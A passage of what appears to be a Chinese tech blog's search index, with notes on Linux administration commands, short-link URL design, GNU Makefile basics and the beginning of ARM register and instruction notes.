③扩展处理：统计某个目录下的文档的总个数？ 答：#ls / | wc -l 22.hostname指令作用：操作服务器的主机名（读取or设置） 语法1：#hostname含义：表示输出完整的主机名 语法2：#hostname -f 含义：表示输出当前主机名中的FQDN（全限定域名） 23.id指令作用：查看一个用户的一些基本信息（包含用户id，用户组id，附加组id…），该指令如果不指定用户则默认当前用户。 语法1：#id默认显示当前执行该命令的用户的基本信息 语法2：#id username显示指定账户（username）的基本信息 验证用户信息可通过文件（/etc/passwd） 验证用户组信息可通过文件（/etv/group） 24.whoami指令作用：“我是谁？”，显示当前登录的用户名，一般用于shell脚本，用于获取当前操作系统的用户名方便记录日志。 语法：#whoami 25.ps -ef指令指令：ps 作用：用于查看服务器进程信息 选项含义： ​ -e：等价于“-A”，表示列出全部的进程 ​ -f：显示全部的列（显示全字段） 12345678910各列的含义：UID：该进程执行的用户id；PID：进程id；PPID：该进程的父级进程id，如果一个程序的父级进程找不到，该程序的进程称之为僵尸进程（parent process ID）；C：Cpu的占用率，其形式是百分数；STIME：进行的启动时间；TTY：终端设备，发起该进程的设备识别符号，如果显示“?”则表示该进程并不是由终端设备发起；TIME：进程的执行时间；CMD：该进程的名称或者对应的路径 #ps -ef | grep “进程名称”用于查看特定进程的状态 26.top指令作用：查看服务器的进程占用的资源 语法：进入命令：#top（动态显示）退出命令：按下q键 12345678910111213表头含义：PID：进程id；USER：该进程对应的用户；PR：优先级；VIRT：虚拟内存；RES：常驻内存；SHR：共享内存； 计算一个进程实际使用的内存 = 常驻内存（RES）- 共享内存（SHR）S：表示进程的状态status（sleeping，其中S表示睡眠，R表示运行）；%CPU：表示CPU的占用百分比；%MEM：表示内存的占用百分比；TIME+：执行的时间；COMMAND：进程的名称或者路径 在运行top命令时，可以有如下快捷键： M：表示将结果按照内存（MEM）从高到低进行降序排列 P：表示将结果按照CPU使用率从高到低进行降序排列 1：当服务器拥有多个CPU的时候可以使用“1”快捷键来切换是否展示显示各个cpu的详细信息 27.du -sh指令作用：查看目录的真实大小 语法：#du -sh 目录路径选项含义： ​ -s：summaries，只显示汇总的大小 ​ -h：表示以高可读性的形式进行显示 28.find指令作用：用于查找文件（参数贼多，55个） 语法：#find 路径范围 选项 选项的值选项： ​ -name：按照文件名称进行搜索（支持模糊搜索） ​ -type：按照文件的类型进行搜索（文件类型：“-”表示文件，在使用find的使用需要用f来替换；“d”表示文件夹） 注：*为通配符，匹配所有字符 29.service指令作用：用于控制一些软件的服务启动、停止、重启 语法：#service 服务名 start/stop/restart例：启动本机安装的Apache，其服务名为httpd 其服务启动规则可自己编写，后续将会专门开一篇讲述 30.kill指令作用：表示杀死进程（当遇到僵尸进程或者处于某些原因需要关闭进程的时候） 语法：#kill 进程的PID（需要配合ps一起使用） 与kill相似的命令：#killall 语法：#killall 进程名称 31.ifconfig指令作用：用于操作网卡相关的指令 语法：#ifconfig（获取网卡信息） 注意该命令在windows环境下为ipconfig Eth0表示Linux中的一个网卡，eth0是其名称。Lo（loop，本地回还网卡，其ip地址一般都是127.0.0.1）也是一个网卡名称。注意：inet addr就是网卡的ip地址。 32.reboot指令作用：重启计算机 语法1：#reboot重启 语法2：#reboot -w模拟重启，但是不重启（只写关机与开机的日志信息） 33.shutdown指令作用：关机（慎用） 语法1：#shutdown -h now “关机提示”#shutdown -h time(14:41) “关机提示” 如果想要取消关机计划的话，则可以按照以下方式去尝试： ①针对于centos7.x之前的版本：ctrl+c ②针对于centos7.x（包含）之后的版本：#shutdown -c 除了shutdown关机以外，还有以下几个关机命令 #init 0 #halt #poweroff 34.uptime指令作用：输出计算机的持续在线时间（计算机从开机到现在运行的时间） 语法：#uptime 35.uname指令作用：获取计算机操作系统的相关信息 语法1：#uname获取操作系统类型 语法2：#uname -a-a：表示all，表示获取全部的系统信息（类型、全部主机名、内核版本、发布时间、开源计划） 36.netstat -tnlp指令作用：查看网络连接状态 语法：#netstat -tnlp 12345选项说明： -t：表示只列出tcp协议的连接； -n：表示将地址从字母组合转化成ip地址，将协议转化成端口号来显示； -l：表示过滤出“state（状态）”列中其值为LISTEN（监听）的连接； -p：表示显示发起连接的进程pid和进程名称； 37.man指令作用：manual，手册（包含了Linux中全部的命令手册，英文） 语法：#man 命令退出按下q键 例：#man cp 编辑器之神——Vim编辑器]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[url]]></title>
    <url>%2F2019%2F08%2F19%2Furl%2F</url>
    <content type="text"><![CDATA[URL 引用： url_Wiki) 短链接原理分析 短链接的算法 统一资源定位符（英语：Uniform Resource Locator）统一资源定位符（英语：Uniform Resource Locator，缩写：URL；或称统一资源定位器、定位地址、URL地址，俗称网页地址或简称网址）是因特网上标准的资源的地址（Address），如同在网络上的门牌。它最初是由蒂姆·伯纳斯-李发明用来作为万维网的地址，现在它已经被[万维网联盟4编制为因特网标准RFC 1738。 在互联网的历史上，统一资源定位符的发明是一个非常基础的步骤。统一资源定位符的语法是一般的，可扩展的，它使用美国信息交换标准代码的一部分来表示因特网的地址。统一资源定位符的开始，一般会标志着一个计算机网络所使用的网络协议。 统一资源定位符的标准格式如下： 12[协议类型]: //服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID[protocol]://server_address:port/path_and_filename?search#fragmentID 统一资源定位符的完整格式如下： 1[协议类型]: //访问资源需要的凭证信息@服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID 其中[访问凭证信息]、[端口号]、[查询]、[片段ID]都属于选填项。 语法超文本传输协议（http）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中： 传送协议。 层级URL标记符号(为[//],固定不变) 访问资源需要的凭证信息（可省略） 服务器。（通常为域名，有时为IP地址） 端口号。（以数字方式表示，若为默认值可省略） 路径。（以“/”字符区别路径中的每一个目录名称） 查询。（GET模式的窗体参数，以“?”字符为起点，每个参数以“&amp;”隔开，再以“=”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题） 片段。以“#”字符为起点 以http://zh.wikipedia.org:80/w/index.php?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2 为例, 其中： http，是协议； zh.wikipedia.org，是服务器； 80，是服务器上的网络端口号； /w/index.php，是路径； ?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2，是询问。 大多数网页浏览器不要求用户输入网页中“http://”的部分，因为绝大多数网页内容是超文本传输协议文件。同样，“80”是超文本传输协议文件的常用端口号，因此一般也不必写明。一般来说用户只要键入统一资源定位符的一部分（zh.wikipedia.org/wiki/Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2）就可以了。 由于超文本传输协议允许服务器将浏览器重定向到另一个网页地址，因此许多服务器允许用户省略网页地址中的部分，比如 www。从技术上来说这样省略后的网页地址实际上是一个不同的网页地址，浏览器本身无法决定这个新地址是否通，服务器必须完成重定向的任务 短链接短链接本质上是http协议中的重定向内容，一般为http301和http302 短链接的优势：简短、美观、便于传播 原理例如短链接 http://qnr.io/j6Dcss DNS解析qnr.io域名，发送GET请求 /j6Dcss 服务器会通过短码获取对应的原URL 然后通过 HTTP 302 （或HTTP 301）转到对应的原URL 常见算法实现自增序列算法短址的长度一般设为 6 位，而每一位是由 [a - z, A - Z, 0 - 9] 总共 62 个字母组成的，所以 6 位的话，总共会有 62^6 ~= 568亿种组合，一般肯定是够用了。将原网址分配一个从1位到6位的随机短码，存数据库记录，对返回的id进行62进制转码。 即可使用发号策略。发号策略是这样的，当一个新的链接过来时，发号器发一个号与之对应。往后只要有新链接过来，发号器不停发号就好。举个例子，第一个进来的链接发号器发0号，对应的短链接为 xx.xxx/0，第二个进来的链接发号器发1号，对应的短链接为 xx.xxx/1，以此类推。发号器发出的10进制号需要转换成62进制，这样可以大大缩短号码转换成字符串后的长度。比如发号器发出 10,000,000,000 这个号码，如果不转换成62进制，直接拼接在域名后面，得到这样一个链接 xx.xxx/10000000000。将上面的号码转换成62进制，结果为AOYKUa，长度只有6位，拼接得到的链接为 xx.xxx/AOYKUa。可以看得出，进制转换后得到的短链接长度变短了一些。6位62进制数，对应的号码空间为626，约等于568亿。也就是说发号器可以发568亿个号，这个号码空间应该能够满足多数项目的需求了，所以基本上不用担心发号器无号可发的情况。上述是发号策略压缩URL的原理，在实际写代码的过程中还需要考虑很多细节，比如缓存，存储等。 摘要算法将原网址 md5 生成 32 位签名串,分为 4 段, 每段 8 个字节对这四段循环处理, 取 8 个字节, 将他看成 16 进制串与0x3fffffff(30位1) 与操作, 即超过 30 位的忽略处理 这 30 位分成 6 段, 每 5位的数字作为字母表的索引取得特定字符, 依次进行获得 6 位字符串总的 md5 串可以获得 4 个 6位串,取里面的任意一个就可作为这个长 url 的短 url 地址 这种算法,虽然会生成4个,但是仍然存在重复几率 算法比较第一种算法的好处就是简单好理解，永不重复。但是短码的长度不固定，随着 id 变大从一位长度开始递增。如果非要让短码长度固定也可以就是让 id 从指定的数字开始递增就可以了。 第二种算法，虽然几率很小，但是存在碰撞（重复）的可能性。短码位数是比较固定的。 Q：同一长链接，每次转成的短链接是否一样A：同一长链接，每次转成的短链接不一定一样，原因在于如果查询缓存时，如果未命中，发号器会发新号给这个链接。需要说明的是，缓存应该缓存经常转换的热门链接，假设设定缓存过期时间为一小时，如果某个链接很活跃的话，缓存查询命中后，缓存会刷新这个链接的存活时间，重新计时，这个链接就会长久存在缓存中。对于一些生僻链接，从存入缓存开始，在存活时间内很可能不会被再次访问，存活时间结束缓存会删除记录。下一次转换这个生僻链接，缓存不命中，发号器会重新发号。这样一来会导致一条长链接对应多条短链接的情况出现，不仅浪费存储空间，又浪费发号器资源。那么是否有办法解决这个问题呢？是不是可以考虑建立一个长链接-短链接的key-value表，将所有的长链接和对应的短链接都存入其中，这样一来就实现了长短链接一一对应的了。但是想法是美好的，现实是不行的，原因在于，将所有的长链接-短链接对存入这样的表中，本身就需要耗费大量的存储空间，相对于生僻链接可能会对应多条短链接浪费的那点空间，这样做显然就得不偿失了。 HTTP 301与 302的区别301 是永久重定向，302 是临时重定向。短地址一经生成就不会变化，所以用 301 是符合 http 语义的。同时对服务器压力也会有一定减少。用户第一次访问某个短链接后，如果服务器返回301状态码，则这个用户在后续多次访问统一短链接，浏览器会直接请求跳转地址，而不是短链接地址，这样一来服务器端就无法收到用户的请求。如果服务器返回302状态码，且告知浏览器不缓存短链接请求，那么用户每次访问短链接，都会先去短链接服务端取回长链接地址，然后在跳转。从语义上来说，301跳转更为合适，因为是永久跳转，不会每次都访问服务端，还可以减小服务端压力。但如果使用301跳转，服务端就无法精确搜集用户的访问行为了。相反302跳转会导致服务端压力增大，但服务端此时就可精确搜集用户的访问行为。但是如果使用了 301，我们就无法统计到短地址被点击的次数了。而点收集击次数的意义那就不言而喻了，关键是现在服务器硬件设备都很好，还有支持高并发的NGINX，所以对服务器的压力几乎可以忽略，最终也就选择302。]]></content>
      <tags>
        <tag>url</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Makefile]]></title>
    <url>%2F2019%2F06%2F06%2FMakefile%2F</url>
    <content type="text"><![CDATA[Make 本文参考： GNU+make中文手册 GNU+make原版官方手册 make wiki Makefile由浅入深 跟我一起写Makefile 序​ 最初了解到Makefile，还是从很久很久以前说起。当时在老师底下做项目，要配置一个nginx服务器，当初给出教程是直接make&amp;&amp;make install就完事了，打完代码一行行执行下来看起来非常有成就感233333 ​ 但是之后在做计算机系统的实验时，才发现Makefile是如此的有用万能，无论是windows还是linux(ubuntu 16.04)下，只需要一个make就能解决编译链接安装问题，make完就能立即使用，实属好用。在之后的操作系统实验中，真正接触到了Makefile这东西，基本每个实验都要写Makefile，因此对Makefile的格式有了一个大概印象，但不过想深入了解一波，便去找了许多资料看。 概述在软件开发中，make是一个工具程序（Utility software），经由读取叫做“makefile”的文件，自动化建构软件。它是一种转化文件形式的工具，转换的目标称为“target”；与此同时，它也检查文件的依赖关系，如果需要的话，它会调用一些外部软件来完成任务。它的依赖关系检查系统非常简单，主要根据依赖文件的修改时间进行判断。大多数情况下，它被用来编译源代码，生成结果代码，然后把结果代码连接起来生成可执行文件或者库文件。它使用叫做“makefile”的文件来确定一个target文件的依赖关系，然后把生成这个target的相关命令传给shell去执行。 许多现代软件的开发中（如Microsoft Visual Studio（他其实有提供一个vs 2017 交叉工具命令提示符，可以进行make，但不过一般在IDE中直接编译生成独有的工程配置文件）），集成开发环境已经取代make，但是在Unix环境中，仍然有许多任务程师采用make来协助软件开发。 Makefile介绍make命令执行时，需要一个makefile文件，以告诉make命令需要怎么样的去编译和链接程序。 首先，我们用一个示例来说明makefile的书写规则，以便给大家一个感性认识。这个示例来源于gnu 的make使用手册，在这个示例中，我们的工程有8个c文件，和3个头文件，我们要写一个makefile来告 诉make命令如何编译和链接这几个文件。我们的规则是： 如果这个工程没有编译过，那么我们的所有c文件都要编译并被链接。 如果这个工程的某几个c文件被修改，那么我们只编译被修改的c文件，并链接目标程序。 如果这个工程的头文件被改变了，那么我们需要编译引用了这几个头文件的c文件，并链接目标程序。 只要我们的makefile写得够好，所有的这一切，我们只用一个make命令就可以完成，make命令会自动智能 地根据当前的文件修改的情况来确定哪些文件需要重编译，从而自动编译所需要的文件和链接目标程序。 Makefile规则12345678#Makefile中，用#表示注释target ...: prerequisites ... command 1 #注意命令前要用Tab command 2 ... ...#可以使用“\”表示续行，但是“\”之后不能有空格 target 可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。对 于标签这种特性，在后续的“伪目标”章节中会有叙述。 prerequisites 生成该target所依赖的文件和/或target command 该target要执行的命令（任意的shell命令） 这是一个文件的依赖关系，也就是说，target这一个或多个的目标文件依赖于prerequisites中的文件， 其生成规则定义在command中。说白一点就是说: prerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。 这就是Makefile中最核心的规则。 实例采用GNU make 手册中的例子 123456789101112131415161718192021222324edit : main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \ insert.o search.o files.o utils.omain.o : main.c defs.h cc -c main.ckbd.o : kbd.c defs.h command.h cc -c kbd.ccommand.o : command.c defs.h command.h cc -c command.cdisplay.o : display.c defs.h buffer.h cc -c display.cinsert.o : insert.c defs.h buffer.h cc -c insert.csearch.o : search.c defs.h buffer.h cc -c search.cfiles.o : files.c defs.h buffer.h command.h cc -c files.cutils.o : utils.c defs.h cc -c utils.cclean : rm edit main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o 该工程有3个头文件和8个c文件 其中反斜杠(“\”)是换行符，注意换行符之后不能用空格。换行符又利用Makefile的阅读。 把Makefile放在处于工程下的，然后在该目录下输入make命令，就可以生成可执行文件了。如果要删除执行文件和所有的中间目标文件，那么只需要执行make clean就可以了。 在这个makefile中，目标文件（target）包含：执行文件edit和中间目标文件（ *.o ），依赖文 件（prerequisites）就是冒号后面的那些 .c 文件和 .h 文件。每一个 .o 文件都有 一组依赖文件，而这些 .o 文件又是执行文件 edit 的依赖文件。依赖关系的实质就是说明了目 标文件是由哪些文件生成的，换言之，目标文件是哪些文件更新的。 这里要说明一点的是， clean 不是一个文件，它只不过是一个动作名字，有点像c语言中的label一 样，其冒号后什么也没有，那么，make就不会自动去找它的依赖性，也就不会自动执行其后所定义的命令。 要执行其后的命令，就要在make命令后明显得指出这个label的名字。这样的方法非常有用，我们可以在一 个makefile中定义不用的编译或是和编译无关的命令，比如程序的打包，程序的备份，等等。 make的执行过程如下： 依次读取变量“MAKEFILES”定义的makefile文件列表 读取工作目录下的makefile文件（GNU make的顺序：缺省的是根据命名的查找顺序“GNUmakefile”，“makefile”，“Makefile”，首先找到那个就读取那个（假如是MAKEFILE，需要用make -f）） 依次读取工作目录makefile文件中使用指示符“include”包含的文件 查找重建所有已读取的makefile文件的规则（如果存在一个目标是当前读取的某一个makefile文件，则执行此规则重建此makefile文件，完成以后从第一步开始重新执行） 初始化变量值并展开那些需要立即展开的变量和函数并根据预设条件确定执行分支 根据“终极目标”以及其他目标的依赖关系建立依赖关系链表 执行除“终极目标”以外的所有的目标的规则（规则中如果依赖文件中任一个文件的时间戳比目标文件新，则使用规则所定义的命令重建目标文件） 执行“终极目标”所在的规则 一上面那个工程为示例： 1234567891011在默认的方式下，也就是我们只输入 make 命令。那么，1.make会在当前目录下找名字叫“Makefile”或“makefile”的文件。2.如果找到，它会找文件中的第一个目标文件（target），在上面的例子中，他会找到“edit”这个 文件，并把这个文件作为最终的目标文件。3.如果edit文件不存在，或是edit所依赖的后面的 .o 文件的文件修改时间要比 edit 这个 文件新，那么，他就会执行后面所定义的命令来生成 edit 这个文件。4.如果 edit 所依赖的 .o 文件也不存在，那么make会在当前文件中找目标为 .o 文件 的依赖性，如果找到则再根据那一个规则生成 .o 文件。（这有点像一个堆栈的过程）5.当然，你的C文件和H文件是存在的啦，于是make会生成 .o 文件，然后再用 .o 文件生 成make的终极任务，也就是执行文件 edit 了。 这就是整个make的依赖性，make会一层又一层地去找文件的依赖关系，直到最终编译出第一个目标文件。在 找寻的过程中，如果出现错误，比如最后被依赖的文件找不到，那么make就会直接退出，并报错，而对于所定义的命令的错误，或是编译不成功，make根本不理。make只管文件的依赖性。 像 clean 这种，没有被第一个目标文件直接或间接关联，那么它后面所定义的命 令将不会被自动执行，不过，我们可以显示要make执行。即命令—— make clean ，以此来清除所有 的目标文件，以便重编译。 如果这个工程已被编译过了，当我们修改了其中一个源文件，比如 file.c ， 那么根据我们的依赖性，我们的目标 file.o 会被重编译（也就是在这个依性关系后面所定义的命令）， 于是 file.o 的文件也是最新的啦，于是 file.o 的文件修改时间要比 edit 要新，所 以 edit 也会被重新链接了（详见 edit 目标文件后定义的命令）。比如我们改变了 command.h ，那么， kdb.o 、 command.o 和 files.o 都 会被重编译，并且， edit 会被重链接。 Makefile中使用变量总所周知，变量是个好东西0.0 在Makefile中使用变量有利于我们对其有更好的维护性。 跟通常编程一样，变量名最好简(jian)洁(dan)易(cu)懂(bao)，有利于人们明白其代表的含义。 在上面例子中，edit后面的一串便可以进行替代了。 1234edit : main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o 当我们需要添加文件时，需要修改多个地方，使用变量能很好地为我们节省时间。 只需在前面声明变量就好，比如objects，objs，obj等等，只要能很好明白其代表的含义就行 1234567891011121314151617181920212223objs = main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o edit : $(objs) cc -o edit $(objs)main.o : main.c defs.h cc -c main.ckbd.o : kbd.c defs.h command.h cc -c kbd.ccommand.o : command.c defs.h command.h cc -c command.cdisplay.o : display.c defs.h buffer.h cc -c display.cinsert.o : insert.c defs.h buffer.h cc -c insert.csearch.o : search.c defs.h buffer.h cc -c search.cfiles.o : files.c defs.h buffer.h command.h cc -c files.cutils.o : utils.c defs.h cc -c utils.cclean : rm edit $(objs) 比如这样，当我们需要添加新的 .o 文件的时候，只需要修改objs = ...就行了 Makefile的自动推导GNU的make可以自动推到文件及文件依赖关系后面的命令，于是我们就没必要去在每一个 .o 文件后都写上类似的命令，因为，我们的make会自动识别，并自己推导命令。 只要make看到一个 .o 文件，它就会自动的把 .c 文件加在依赖关系中，如果make找到一个whatever.o ，那么 whatever.c 就会是 whatever.o 的依赖文件。并且 cc -c whatever.c 也会被推导出来，于是，我们的makefile再也不用写得这么复杂。我们的 新makefile又出炉了。 123456789101112131415161718objects = main.o kbd.o command.o display.o \ insert.o search.o files.o utils.oedit : $(objects) cc -o edit $(objects)main.o : defs.hkbd.o : defs.h command.hcommand.o : defs.h command.hdisplay.o : defs.h buffer.hinsert.o : defs.h buffer.hsearch.o : defs.h buffer.hfiles.o : defs.h buffer.h command.hutils.o : defs.h.PHONY : cleanclean : rm edit $(objects) 这种方法，也就是make的“隐晦规则”。 .PHONY 表示 clean 是个伪目标 文件。 另类风格的Makefile既然我们的make可以自动推导命令，那么我看到那堆 .o 和 .h 的依赖就有点不爽，那么多的 重复的 .h ，能不能把其收拢起来，好吧，没有问题，这个对于make来说很容易，谁叫它提供了自动 推导命令和文件的功能呢？来看看最新风格的makefile吧。 12345678910111213objects = main.o kbd.o command.o display.o \ insert.o search.o files.o utils.oedit : $(objects) cc -o edit $(objects)$(objects) : defs.hkbd.o command.o files.o : command.hdisplay.o insert.o search.o files.o : buffer.h.PHONY : cleanclean : rm edit $(objects) 清空目标文件的规则每个Makefile中都应该写一个清空目标文件（ .o 和执行文件）的规则，这不仅便于重编译，也很 利于保持文件的清洁。 12clean: rm edit $(objects) 更为稳健的做法是： 123.PHONY : cleanclean : -rm edit $(objects) 前面说过， .PHONY 表示 clean 是一个“伪目标”。而在 rm 命令前面加了一个小减号的 意思就是，也许某些文件出现问题，但不要管，继续做后面的事。当然， clean 的规则不要放在文件 的开头，不然，这就会变成make的默认目标，相信谁也不愿意这样。不成文的规矩是——“clean从来都是放 在文件的最后”。 Makefile里有什么？Makefile里主要包含了五个东西：显式规则、隐晦规则、变量定义、文件指示和注释。 显式规则。显式规则说明了如何生成一个或多个目标文件。这是由Makefile的书写者明显指出要生成的 文件、文件的依赖文件和生成的命令。 隐晦规则。由于我们的make有自动推导的功能，所以隐晦的规则可以让我们比较简略地书写 Makefile，这是由make所支持的。 变量的定义。在Makefile中我们要定义一系列的变量，变量一般都是字符串，这个有点像你C语言中的 宏，当Makefile被执行时，其中的变量都会被扩展到相应的引用位置上。 文件指示。其包括了三个部分，一个是在一个Makefile中引用另一个Makefile，就像C语言中 的include一样；另一个是指根据某些情况指定Makefile中的有效部分，就像C语言中的预编译#if一 样；还有就是定义一个多行的命令。有关这一部分的内容，我会在后续的部分中讲述。 注释。Makefile中只有行注释，和UNIX的Shell脚本一样，其注释是用 # 字符，这个就 像C/C++中的 // 一样。如果你要在你的Makefile中使用 # 字符，可以用反斜杠进行转义，如： \# 。 还有的就是在Makefile中的命令，必须要以 Tab 键开始。 Makefile的文件名因为make程序已被用户多次重/改写，其中包括几次用相同的文件格式和算法原理重新编写，并且依照不同需要添加了一些不常见的改良。 现在的版本，大致是 GNU make，BSD make，Microsoft nmake。 默认的情况下，gnu的make命令会在当前目录下按顺序找寻文件名为“GNUmakefile”、 “makefile”、“Makefile”的文件，找到了解释这个文件。在这三个文件名中，最好使用“Makefile” 这个文件名，因为，这个文件名第一个字符为大写，这样有一种显目的感觉。最好不要用“GNUmakefile”， 这个文件是GNU的make识别的。有另外一些make只对全小写的“makefile”文件名敏感，但是基本上来说， 大多数的make都支持“makefile”和“Makefile”这两种默认文件名。 当然，你可以使用别的文件名来书写Makefile，比如：“Make.Linux”，“Make.Solaris” ，“Make.AIX”等，如果要指定特定的Makefile，你可以使用make的 -f 和 --file 参数， 如： make -f Make.Linux 或 make --file Make.AIX 。 引用其他的Makefile在Makefile使用 include 关键字可以把别的Makefile包含进来，这很像C语言的 #include ，被包含的文件会原模原样的放在当前文件的包含位置。 include 的语法是： 1include &lt;filename&gt; filename 可以是当前操作系统Shell的文件模式（可以包含路径和通配符）。 在 include 前面可以有一些空字符，但是绝不能是 Tab 键开始。 include 和 &lt;filename&gt; 可以用一个或多个空格隔开。举个例子，你有这样几个Makefile： a.mk 、 b.mk 、 c.mk ，还有一个文件叫 foo.make ，以及一个变量 $(bar) ，其包含 了 e.mk 和 f.mk ，那么，下面的语句： 12bar = e.mk f.mkinclude foo.make *.mk $(bar) 等价于： 1include foo.make a.mk b.mk c.mk e.mk f.mk make命令开始时，会找寻 include 所指出的其它Makefile，并把其内容安置在当前的位置。就好 像C/C++的 #include 指令一样。如果文件都没有指定绝对路径或是相对路径的话，make会在当前目 录下首先寻找，如果当前目录下没有找到，那么，make还会在下面的几个目录下找： 如果make执行时，有 -I 或 --include-dir 参数，那么make就会在这个参数所指定的目 录下去寻找。 如果目录 &lt;prefix&gt;/include （一般是： /usr/local/bin 或 /usr/include ）存在的话，make也会去找。 如果有文件没有找到的话，make会生成一条警告信息，但不会马上出现致命错误。它会继续载入其它的 文件，一旦完成makefile的读取，make会再重试这些没有找到，或是不能读取的文件，如果还是 不行，make才会出现一条致命信息。如果你想让make不理那些无法读取的文件，而继续执行，你可以 在include前加一个减号“-”。如： 1-include &lt;filename&gt; 其表示，无论include过程中出现什么错误，都不要报错继续执行。和其它版本make兼容的相关命令 是sinclude，其作用和这一个是一样的。 环境变量MAKEFILES如果你的当前环境中定义了环境变量 MAKEFILES ，那么，make会把这个变量中的值做一个类似于include 的动作。这个变量中的值是其它的Makefile，用空格分隔。只是，它和 include 不 同的是，从这个环境变量中引入的Makefile的“目标”不会起作用，如果环境变量中定义的文件发现 错误，make也会不理。 但是在这里我还是建议不要使用这个环境变量，因为只要这个变量一被定义，那么当你使用make时， 所有的Makefile都会受到它的影响，这绝不是你想看到的。在这里提这个事，只是为了告诉大家，也许 有时候你的Makefile出现了怪事，那么你可以看看当前环境中有没有定义这个变量。 make的工作流程GNU的make工作时的执行步骤如下：（想来其它的make也是类似） 读入所有的Makefile。 读入被include的其它Makefile。 初始化文件中的变量。 推导隐晦规则，并分析所有规则。 为所有的目标文件创建依赖关系链。 根据依赖关系，决定哪些目标要重新生成。 执行生成命令。 1-5步为第一个阶段，6-7为第二个阶段。第一个阶段中，如果定义的变量被使用了，那么，make会把其展 开在使用的位置。但make并不会完全马上展开，make使用的是拖延战术，如果变量出现在依赖关系的规则 中，那么仅当这条依赖被决定要使用了，变量才会在其内部展开。 当然，这个工作方式你不一定要清楚，但是知道这个方式你也会对make更为熟悉。有了这个基础，后续部分 也就容易看懂了。 书写规则]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>make</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPFS]]></title>
    <url>%2F2019%2F05%2F30%2FIPFS%2F</url>
    <content type="text"></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARM]]></title>
    <url>%2F2019%2F05%2F28%2FARM%2F</url>
    <content type="text"><![CDATA[ARM指令集详解 引用： ARM指令集详解 1. 汇编1.1. 通用寄存器 寄存器类别 寄存器在汇编中的名称 各模式下实际访问的寄存器 用户 系统 管理 中止 未定义 中断 快中断 通用寄存器和程序计数器 R0(a1) R0 R1(a2) R1 R2(a3) R2 R3(a4) R3 R4(v1) R4 R5(v2) R5 R6(v3) R6 R7(v4) R7 R8(v5) R8 R8_fiq R9(SB,v6) R9 R9_fiq R10(SL,v7) R10 R10_fiq R11(FP,v8) R11 R11_fiq R12(IP) R12 R12_fiq R13(SP) R13 R13_svc R13_abt R13_und R13_irq R13_fiq R14(LR) R14 R14_svc R14_abt R14_und R14_irq R14_fiq * R15(PC) R15 状态寄存器 R16(CPSR) CPSR SPSR 无 SPSR_svc SPSR_abt SPSR_und SPSR_irq SPSR_fiq 通用寄存器 37个寄存器，31个通用寄存器，6个状态寄存器。 R12是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。在过程调用之间，可以将它用于任何用途。被调用函数在返回之前不必恢复 r12。 R13堆栈指针sp，R14返回指针，R15为PC指针, cpsr_c代表的是这32位中的低8位，也就是控制位 CPSR有4个8位区域：标志域（F）、状态域（S）、扩展域（X）、控制域（C）MSR - Load specified fields of the CPSR or SPSR with an immediate constant, orfrom the contents of a general-purpose register. Syntax: MSR{cond} _, #immed_8rMSR{cond} _, Rm where: cond is an optional condition code. is either CPSR orSPSR. specifies the field or fields to be moved. can be one or more of: ccontrol field mask byte (PSR[7:0]) x extension field mask byte (PSR[15:8]) sstatus field mask byte (PSR[23:16) f flags field mask byte (PSR[31:24]).immed_8r is an expression evaluating to a numeric constant. The constant mustcorrespond to an 8-bit pattern rotated by an even number of bits within a32-bit word. Rm is the source register. C 控制域屏蔽字节(psr[7:0]) X 扩展域屏蔽字节(psr[15:8]) S 状态域屏蔽字节(psr[23:16]) F 标志域屏蔽字节(psr[31:24]) CPSR寄存器 FIQ和IRQ的区别？ MODE(以下为二进制) 可见的ARM状态寄存器 10000 用户模式 PC,CPSR,R0~R14 10001 FIQ PC,CPSR,SPSR_fiq，R14_fiq~R8_fiq,R7~R0 10010 IRQ PC,CPSR,SPSR_irq，R14_irq~R13_irq,R12~R0 10011 管理模式(svc) PC,CPSR,SPSR_svc，R14_svc~R13_svc,R12~R0 10111 终止模式 PC,CPSR,SPSR_abt，R14_abt~R13_abt,R12~R0 11011 未定义 PC,CPSR,SPSR_und，R14_und~R13_und,R2~R0 11111 系统模式(sys) PC,CPSR，R14 ~R0 1.2. 指令格式1) 基本格式 ​ &lt;opcode&gt;{&lt;cond&gt;}{S} &lt;Rd&gt;,&lt;Rn&gt;{,&lt;opcode2&gt;} ​ 其中，&lt;&gt;内的项是必须的，{}内的项是可选的，如是指令助记符，是必须的，而{}为指令执行条件，是可选的，如果不写则使用默认条件AL(无条件执行)。 ​ opcode 指令助记符，如LDR，STR 等 ​ cond 执行条件，如EQ，NE 等 ​ S 是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响 ​ Rd 目标寄存器 ​ Rn 第一个操作数的寄存器 ​ operand2 第二个操作数 ​ 指令格式举例如下： ​ LDREX–这条指令主要是从memory中取一个数，然后放到register中，但是相比普通的LDR指令，在于其内在的原子操作特性, 信号量和spin lock这些东西最核心的事情基本上就是load-update-store序列，为了防止并发，必须保证这个序列是原子的，所谓原子，即处理器在执行这个指令序列时，得绝对占有处理器而不能够被切换出去。在ARM上，从V6开始，指令LDREX和STREX就是用来干这事的 ​ LDR R0,[R1] ;读取R1 地址上的存储器单元内容，执行条件AL​ BEQ DATAEVEN 